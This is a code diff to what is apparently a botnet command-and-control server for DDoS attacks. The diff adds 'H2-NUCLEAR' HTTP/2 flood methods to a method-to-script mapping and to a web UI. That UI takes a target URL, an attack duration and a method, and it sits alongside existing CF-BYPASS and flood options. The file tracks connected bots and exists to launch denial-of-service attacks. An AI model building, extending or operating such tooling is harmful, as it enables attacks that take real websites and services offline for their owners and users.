@@ -78,8 +78,14 @@ setInterval(() => {
   serverStats.uptime = Math.floor((Date.now() - serverStats.startTime) / 1000);
 }, 5000);
 
-// ========== METHOD FILES MAPPING ==========
+// ========== METHOD FILES MAPPING (UPDATED) ==========
 const methodFiles = {
+  // NEW H2-NUCLEAR METHODS
+  'H2-NUCLEAR': 'methods/h2-nuclear.js',
+  'H2N': 'methods/h2-nuclear.js',
+  'H2N-MAX': 'methods/h2-nuclear.js',
+  
+  // Existing methods
   'RAW-GET': 'methods/raw-get.js',
   'CF-BYPASS': 'methods/cf-bypass.js',
   'MODERN-FLOOD': 'methods/modern-flood.js',
@@ -374,7 +380,7 @@ app.get('/health', (req, res) => {
   res.json({ status: 'healthy', bots: connectedBots.length, uptime: serverStats.uptime });
 });
 
-// ========== WEB UI ==========
+// ========== WEB UI (UPDATED WITH NEW METHODS) ==========
 const HTML_UI = [
   '<!DOCTYPE html>',
   '<html lang="en">',
@@ -569,6 +575,9 @@ const HTML_UI = [
   '        <input type="text" id="attackTarget" placeholder="Target URL (e.g., https://example.com)">',
   '        <input type="number" id="attackTime" placeholder="Time (seconds)" value="60">',
   '        <select id="attackMethod">',
+  '          <!-- NEW H2-NUCLEAR METHODS -->',
+  '          <option value="H2-NUCLEAR">💀 H2-NUCLEAR (HTTP/2 Flood)</option>',
+  '          <option value="H2N-MAX">💀💀 H2N-MAX (Max Power)</option>',
   '          <option value="RAW-GET">RAW-GET</option>',
   '          <option value="CF-BYPASS">CF-BYPASS</option>',
   '          <option value="MODERN-FLOOD">MODERN-FLOOD</option>',
